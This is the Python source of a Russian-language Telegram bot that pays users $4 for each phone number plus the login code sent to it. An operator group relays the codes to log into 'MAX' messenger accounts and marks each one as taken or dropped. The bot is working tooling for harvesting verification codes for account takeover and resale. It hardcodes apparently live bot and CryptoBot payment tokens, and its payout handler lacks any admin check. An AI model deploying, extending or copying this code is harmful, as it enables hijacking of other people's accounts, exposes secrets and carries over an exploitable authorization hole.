import logging
import time
import aiohttp
import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ContentType
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.utils import executor

# ==================== НАСТРОЙКИ ====================
API_TOKEN = '8275984773:AAG36P1s-zKEok7rCJYaCyosEyKKfvpKW5M'
CRYPTO_BOT_TOKEN = '549207:AAx7ZcEz3HHAmwyj43vM8ff2tSjAptoLjY1' # Токен из @CryptoBot для проверки баланса и чеков
WEB_APP_URL = 'https://ваша-ссылка-на-веб-апп.com' # Ссылка на ваше веб-приложение
ADMIN_IDS = [8401782614]  # Впишите сюда ваши Telegram ID
REQUIRED_CHANNEL = '@NitroMAXWork' # Канал для обязательной подписки
# ===================================================

logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN, parse_mode="HTML")
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

# Глобальная сессия для максимальной скорости API-запросов
http_session = None

users_db = {}
active_group_id = None
withdraw_requests = []
numbers_queue = []
daily_stats = {"date": time.strftime("%Y-%m-%d"), "submitted": 0}

# ===== НАСТРОЙКИ ДИЗАЙНА (В ПАМЯТИ) =====
bot_design = {
    "welcome_text": (
        "Привет, ты попал в бота по сдаче макс номер.\n\n"
        "Текущий прайс <b>4$</b> (0-min)\n"
        "<i>Моментальная выплата</i> 💸"
    ),
    "welcome_media": None,      # file_id картинки или GIF
    "welcome_media_type": None  # 'photo' или 'animation'
}

class BotStates(StatesGroup):
    waiting_for_number = State()
    waiting_for_code = State()
    waiting_for_broadcast = State()
    waiting_for_design_text = State()
    waiting_for_design_media = State()

async def on_startup(dispatcher):
    global http_session
    http_session = aiohttp.ClientSession()

async def on_shutdown(dispatcher):
    global http_session
    if http_session:
        await http_session.close()

# Оптимизированные запросы к CryptoBot с использованием глобальной сессии
async def get_crypto_balance():
    if not CRYPTO_BOT_TOKEN or CRYPTO_BOT_TOKEN == 'ВАШ_ТОКЕН_CRYPTOBOT':
        return "Не настроен токен CryptoBot"
    headers = {"Crypto-Pay-API-Token": CRYPTO_BOT_TOKEN}
    try:
        async with http_session.get("https://pay.crypt.bot/api/getBalance", headers=headers) as resp:
            if resp.status == 200:
                data = await resp.json()
                if data.get("ok"):
                    balances = data['result']
                    usdt_balance = next((b['available'] for b in balances if b['currency_code'] == 'USDT'), "0")
                    return f"{usdt_balance} USDT"
            return "Ошибка API"
    except Exception as e:
        return f"Ошибка: {e}"

async def create_crypto_check(amount):
    if not CRYPTO_BOT_TOKEN or CRYPTO_BOT_TOKEN == 'ВАШ_ТОКЕН_CRYPTOBOT':
        return f"https://t.me/CryptoBot?start=CQ_mock_cheque_{amount}USD"
    headers = {"Crypto-Pay-API-Token": CRYPTO_BOT_TOKEN}
    payload = {"asset": "USDT", "amount": str(amount)}
    try:
        async with http_session.post("https://pay.crypt.bot/api/createCheck", headers=headers, json=payload) as resp:
            if resp.status == 200:
                data = await resp.json()
                if data.get("ok"):
                    return data['result']['bot_check_url']
    except Exception as e:
        logging.error(f"Ошибка создания чека: {e}")
    return "Не удалось создать чек через API"

async def check_subscription(user_id):
    try:
        member = await bot.get_chat_member(chat_id=REQUIRED_CHANNEL, user_id=user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return True

def get_sub_keyboard():
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton("📢 Подписаться", url=f"https://t.me/{REQUIRED_CHANNEL.replace('@', '')}"))
    kb.add(InlineKeyboardButton("✅ Я подписался", callback_data="check_sub"))
    return kb

def get_main_keyboard(user_id):
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton("🌐 Открыть Web App", web_app=types.WebAppInfo(url=WEB_APP_URL)))
    kb.add(InlineKeyboardButton("📲 Сдать макс", callback_data="submit_max"))
    kb.row(
        InlineKeyboardButton("👤 Профиль", callback_data="profile"),
        InlineKeyboardButton("💳 Вывод", callback_data="withdraw")
    )
    if user_id in ADMIN_IDS:
        kb.add(InlineKeyboardButton("👑 Админ панель", callback_data="admin_panel"))
    return kb

def get_admin_keyboard():
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("📊 Статистика", callback_data="admin_stats"),
        InlineKeyboardButton("📢 Рассылка", callback_data="admin_broadcast"),
        InlineKeyboardButton("💸 Заявки", callback_data="admin_withdraws"),
        InlineKeyboardButton("🏦 Казна", callback_data="admin_treasury")
    )
    kb.add(InlineKeyboardButton("🎨 Дизайн (Текст/Медиа)", callback_data="admin_design"))
    return kb

def get_design_keyboard():
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton("📝 Изменить текст меню", callback_data="design_text"),
        InlineKeyboardButton("🖼 Изменить картинку/GIF", callback_data="design_media"),
        InlineKeyboardButton("🗑 Удалить медиа", callback_data="design_remove_media"),
        InlineKeyboardButton("🔙 Назад в ПУ", callback_data="admin_panel")
    )
    return kb

# ==========================================
# 1. СТАРТ И ОСНОВНОЕ МЕНЮ (С ДИЗАЙНОМ)
# ==========================================

async def show_main_menu(user_id, username):
    if user_id not in users_db:
        users_db[user_id] = {"balance": 0, "submitted": 0, "username": username}
    
    text = bot_design["welcome_text"]
    kb = get_main_keyboard(user_id)
    
    try:
        if bot_design["welcome_media"]:
            if bot_design["welcome_media_type"] == 'photo':
                await bot.send_photo(user_id, bot_design["welcome_media"], caption=text, reply_markup=kb)
            elif bot_design["welcome_media_type"] == 'animation':
                await bot.send_animation(user_id, bot_design["welcome_media"], caption=text, reply_markup=kb)
        else:
            await bot.send_message(user_id, text, reply_markup=kb)
    except Exception as e:
        logging.error(f"Ошибка отправки меню: {e}")
        await bot.send_message(user_id, text, reply_markup=kb)

@dp.message_handler(commands=['start'], state='*')
async def send_welcome(message: types.Message, state: FSMContext):
    await state.finish()
    user_id = message.from_user.id
    if not await check_subscription(user_id):
        await message.answer("❗️ Для использования бота необходимо подписаться на наш канал!", reply_markup=get_sub_keyboard())
        return
    await show_main_menu(user_id, message.from_user.username or "Без юзернейма")

@dp.callback_query_handler(lambda c: c.data == 'check_sub', state='*')
async def process_check_sub(callback_query: types.CallbackQuery, state: FSMContext):
    user_id = callback_query.from_user.id
    if await check_subscription(user_id):
        await bot.delete_message(callback_query.message.chat.id, callback_query.message.message_id)
        await show_main_menu(user_id, callback_query.from_user.username or "Без юзернейма")
    else:
        await bot.answer_callback_query(callback_query.id, "❌ Вы еще не подписались на канал!", show_alert=True)

@dp.callback_query_handler(lambda c: c.data == 'submit_max', state='*')
async def process_submit_max(callback_query: types.CallbackQuery):
    if not await check_subscription(callback_query.from_user.id):
        return await bot.send_message(callback_query.from_user.id, "❗️ Подпишитесь на канал!", reply_markup=get_sub_keyboard())
    await bot.answer_callback_query(callback_query.id)
    await bot.send_message(callback_query.from_user.id, "Отправьте ваш номер в формате (79991231231212)")
    await BotStates.waiting_for_number.set()

@dp.callback_query_handler(lambda c: c.data == 'profile', state='*')
async def process_profile(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    stats = users_db.get(user_id, {"balance": 0, "submitted": 0})
    text = (f"👤 <b>Ваш профиль</b>\n\nID: <code>{user_id}</code>\n"
            f"Сдано номеров: <b>{stats['submitted']}</b>\nБаланс: <b>{stats['balance']}$</b>")
    await bot.answer_callback_query(callback_query.id)
    await bot.send_message(user_id, text)

# ==========================================
# 2. ВВОД НОМЕРА И КОДА
# ==========================================

@dp.message_handler(state=BotStates.waiting_for_number)
async def process_number(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    users_db[user_id]['current_phone'] = message.text
    users_db[user_id]['username'] = message.from_user.username or "Без юзернейма"
    
    numbers_queue.append({"user_id": user_id, "phone": message.text, "username": users_db[user_id]['username']})
    await message.answer("✅ Ваш номер добавлен в очередь, ожидайте кода.")
    await state.finish()
    
    if active_group_id:
        await bot.send_message(active_group_id, f"📥 <b>Новый номер в очереди!</b>\nВсего ждет: {len(numbers_queue)}")

@dp.message_handler(state=BotStates.waiting_for_code)
async def process_code(message: types.Message, state: FSMContext):
    code = message.text.strip()
    if not code.isdigit() or len(code) != 5:
        return await message.reply("❗️ Код должен состоять ровно из 5 цифр.")
    
    user_id = message.from_user.id
    phone = users_db.get(user_id, {}).get('current_phone', 'Неизвестно')
    username = users_db.get(user_id, {}).get('username', 'Без юзернейма')
    
    await message.answer("✅ Код отправлен, ожидайте ответа.")
    await state.finish()
    
    if active_group_id:
        kb = InlineKeyboardMarkup(row_width=2).add(
            InlineKeyboardButton("✅ Встал", callback_data=f"vstal_{user_id}"),
            InlineKeyboardButton("🔄 Повтор", callback_data=f"retry_{user_id}")
        )
        await bot.send_message(active_group_id, f"🔑 <b>Код:</b> {code}\nНомер: <code>{phone}</code>\nОт: @{username}", reply_markup=kb)

# ==========================================
# 3. АВТОМАТИЧЕСКИЙ ВЫВОД
# ==========================================

@dp.callback_query_handler(lambda c: c.data == 'withdraw', state='*')
async def process_withdraw(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    stats = users_db.get(user_id, {"balance": 0, "submitted": 0, "username": callback_query.from_user.username})
    
    if stats['balance'] < 4:
        await bot.answer_callback_query(callback_query.id, "❌ Недостаточно средств (мин. 4$)", show_alert=True)
    else:
        amount = stats['balance']
        users_db[user_id]['balance'] = 0
        withdraw_requests.append({
            "user_id": user_id, "amount": amount,
            "username": stats.get('username', 'Без юзера'), "submitted": stats.get('submitted', 0)
        })
        await bot.answer_callback_query(callback_query.id)
        await bot.send_message(user_id, "✅ Ваша заявка отправлена администрации.")

# ==========================================
# 4. ЛОГИКА АДМИНА В ГРУППЕ
# ==========================================

@dp.message_handler(commands=['setwork'], state='*')
async def setwork_command(message: types.Message):
    global active_group_id
    active_group_id = message.chat.id
    await message.reply("Бот привязан к этой группе ✅")

@dp.message_handler(commands=['stopwork'], state='*')
async def stopwork_command(message: types.Message):
    global active_group_id
    if active_group_id == message.chat.id:
        active_group_id = None
        await message.reply("Бот отвязан от группы ❌")

@dp.message_handler(lambda m: m.chat.id == active_group_id and m.text.lower() in ['номер', 'очередь'], state='*')
async def group_text_commands(message: types.Message):
    if message.text.lower() == 'очередь':
        await message.reply(f"📊 <b>Очередь номеров:</b> {len(numbers_queue)}")
    elif message.text.lower() == 'номер':
        if not numbers_queue:
            return await message.reply("📭 Очередь пуста!")
        req = numbers_queue.pop(0)
        try:
            await bot.send_message(req['user_id'], "⏳ Ваш номер взяли в работу, сейчас будет код!")
        except:
            pass
        kb = InlineKeyboardMarkup(row_width=1).add(InlineKeyboardButton("💬 Запросить код", callback_data=f"ask_{req['user_id']}"))
        await message.reply(f"📱 <b>Номер:</b> <code>{req['phone']}</code>\nОт: @{req['username']}", reply_markup=kb)

@dp.callback_query_handler(lambda c: c.data.startswith(('ask_', 'vstal_', 'retry_', 'sletel_')), state='*')
async def group_actions(callback_query: types.CallbackQuery):
    data = callback_query.data.split('_')
    action, user_id = data[0], int(data[1])
    
    if action == 'ask':
        try:
            await bot.send_message(user_id, "💬 На ваш номер запрошен код! Напишите его сюда:")
            await dp.current_state(chat=user_id, user=user_id).set_state(BotStates.waiting_for_code)
        except: pass
        await bot.edit_message_reply_markup(callback_query.message.chat.id, callback_query.message.message_id, reply_markup=None)
        await bot.answer_callback_query(callback_query.id, "Код запрошен")
        
    elif action == 'vstal':
        if user_id in users_db:
            users_db[user_id]['balance'] += 4
            users_db[user_id]['submitted'] += 1
        daily_stats["submitted"] = daily_stats["submitted"] + 1 if daily_stats["date"] == time.strftime("%Y-%m-%d") else 1
        daily_stats["date"] = time.strftime("%Y-%m-%d")
        
        try: await bot.send_message(user_id, "✅ Ваш номер встал! 4$ зачислены.")
        except: pass
        
        phone = users_db.get(user_id, {}).get('current_phone', 'Неизвестно')
        kb = InlineKeyboardMarkup().add(InlineKeyboardButton("❌ Слетел", callback_data=f"sletel_{user_id}"))
        await bot.edit_message_text(f"✅ <b>В работе:</b> <code>{phone}</code>", chat_id=callback_query.message.chat.id, message_id=callback_query.message.message_id, reply_markup=kb)
        await bot.answer_callback_query(callback_query.id, "Отмечено как Встал")
        
    elif action == 'retry':
        try:
            await bot.send_message(user_id, "🔄 Неверный код. Отправьте новый код сюда:")
            await dp.current_state(chat=user_id, user=user_id).set_state(BotStates.waiting_for_code)
        except: pass
        await bot.answer_callback_query(callback_query.id, "Запрошен повтор")
        
    elif action == 'sletel':
        try: await bot.send_message(user_id, "❌ Ваш аккаунт слетел.")
        except: pass
        await bot.edit_message_text(f"❌ Слетел: <code>{users_db.get(user_id, {}).get('current_phone', '')}</code>", chat_id=callback_query.message.chat.id, message_id=callback_query.message.message_id)
        await bot.answer_callback_query(callback_query.id, "Отмечено как Слетел")

# ==========================================
# 5. АДМИН-ПАНЕЛЬ И ДИЗАЙН
# ==========================================

@dp.callback_query_handler(lambda c: c.data == 'admin_panel', state='*')
async def admin_panel_open(callback_query: types.CallbackQuery):
    if callback_query.from_user.id in ADMIN_IDS:
        await bot.send_message(callback_query.from_user.id, "👑 <b>Админ панель</b>", reply_markup=get_admin_keyboard())
    await bot.answer_callback_query(callback_query.id)

@dp.callback_query_handler(lambda c: c.data.startswith('admin_'), state='*')
async def admin_actions(callback_query: types.CallbackQuery, state: FSMContext):
    if callback_query.from_user.id not in ADMIN_IDS: return
    action = callback_query.data

    if action == 'admin_stats':
        users_count = len(users_db)
        today = daily_stats["submitted"] if daily_stats["date"] == time.strftime("%Y-%m-%d") else 0
        await bot.send_message(callback_query.from_user.id, f"📊 <b>Статистика:</b>\nЮзеров: {users_count}\nЗа сегодня: {today}")
    elif action == 'admin_broadcast':
        await bot.send_message(callback_query.from_user.id, "Отправьте сообщение для рассылки:")
        await dp.current_state(chat=callback_query.message.chat.id, user=callback_query.from_user.id).set_state(BotStates.waiting_for_broadcast)
    elif action == 'admin_withdraws':
        if not withdraw_requests:
            await bot.send_message(callback_query.from_user.id, "Заявок на вывод пока нет.")
        else:
            for idx, req in enumerate(withdraw_requests):
                kb = InlineKeyboardMarkup().add(InlineKeyboardButton("✅ Одобрить", callback_data=f"pay_{idx}"))
                await bot.send_message(callback_query.from_user.id, f"💳 <b>От:</b> @{req.get('username', '')}\nСдал: {req.get('submitted', 0)}\n💰 <b>Сумма:</b> {req['amount']}$", reply_markup=kb)
    elif action == 'admin_treasury':
        balance_text = await get_crypto_balance()
        await bot.send_message(callback_query.from_user.id, f"🏦 <b>Казна:</b>\nДоступно: <b>{balance_text}</b>")
    elif action == 'admin_design':
        await bot.send_message(callback_query.from_user.id, "🎨 <b>Настройки дизайна</b>\nЗдесь вы можете изменить приветственное сообщение и медиа.", reply_markup=get_design_keyboard())
        
    await bot.answer_callback_query(callback_query.id)

# Функции дизайна
@dp.callback_query_handler(lambda c: c.data.startswith('design_'), state='*')
async def design_actions(callback_query: types.CallbackQuery, state: FSMContext):
    if callback_query.from_user.id not in ADMIN_IDS: return
    action = callback_query.data
    chat_id = callback_query.message.chat.id
    user_id = callback_query.from_user.id
    
    if action == 'design_text':
        await bot.send_message(chat_id, "📝 Отправьте новый текст для главного меню (можно использовать HTML, например <b>жирный</b>):")
        await dp.current_state(chat=chat_id, user=user_id).set_state(BotStates.waiting_for_design_text)
    elif action == 'design_media':
        await bot.send_message(chat_id, "🖼 Отправьте картинку или GIF-анимацию для меню:")
        await dp.current_state(chat=chat_id, user=user_id).set_state(BotStates.waiting_for_design_media)
    elif action == 'design_remove_media':
        bot_design['welcome_media'] = None
        bot_design['welcome_media_type'] = None
        await bot.send_message(chat_id, "✅ Медиа удалено! Будет отображаться только текст.", reply_markup=get_design_keyboard())
    await bot.answer_callback_query(callback_query.id)

@dp.message_handler(state=BotStates.waiting_for_design_text)
async def process_design_text(message: types.Message, state: FSMContext):
    bot_design['welcome_text'] = message.html_text
    await message.answer("✅ Текст главного меню успешно обновлен!", reply_markup=get_design_keyboard())
    await state.finish()

@dp.message_handler(content_types=[ContentType.PHOTO, ContentType.ANIMATION], state=BotStates.waiting_for_design_media)
async def process_design_media(message: types.Message, state: FSMContext):
    if message.photo:
        bot_design['welcome_media'] = message.photo[-1].file_id
        bot_design['welcome_media_type'] = 'photo'
    elif message.animation:
        bot_design['welcome_media'] = message.animation.file_id
        bot_design['welcome_media_type'] = 'animation'
        
    await message.answer("✅ Медиа для главного меню успешно обновлено!", reply_markup=get_design_keyboard())
    await state.finish()

# Рассылка и выплаты
@dp.message_handler(state=BotStates.waiting_for_broadcast)
async def process_broadcast(message: types.Message, state: FSMContext):
    success = 0
    for uid in users_db.keys():
        try:
            await bot.send_message(uid, f"📢 <b>Рассылка:</b>\n\n{message.text}")
            success += 1
        except: pass
    await message.answer(f"✅ Рассылка завершена! Отправлено {success} пользователям.")
    await state.finish()

@dp.callback_query_handler(lambda c: c.data.startswith('pay_'), state='*')
async def process_payment(callback_query: types.CallbackQuery):
    idx = int(callback_query.data.split('_')[1])
    if idx < len(withdraw_requests):
        req = withdraw_requests.pop(idx)
        cheque_link = await create_crypto_check(req['amount'])
        try:
            await bot.send_message(req['user_id'], f"🧾 <b>Заявка одобрена!</b>\nСумма чека: {req['amount']}$\n👉 <a href='{cheque_link}'>Забрать чек</a>")
        except: pass
        await bot.edit_message_text(f"✅ Заявка от @{req.get('username', '???')} на {req['amount']}$ одобрена", chat_id=callback_query.message.chat.id, message_id=callback_query.message.message_id)
    await bot.answer_callback_query(callback_query.id)

if __name__ == '__main__':
    print("Бот запущен!")
    executor.start_polling(dp, skip_updates=True, on_startup=on_startup, on_shutdown=on_shutdown)

aiogram
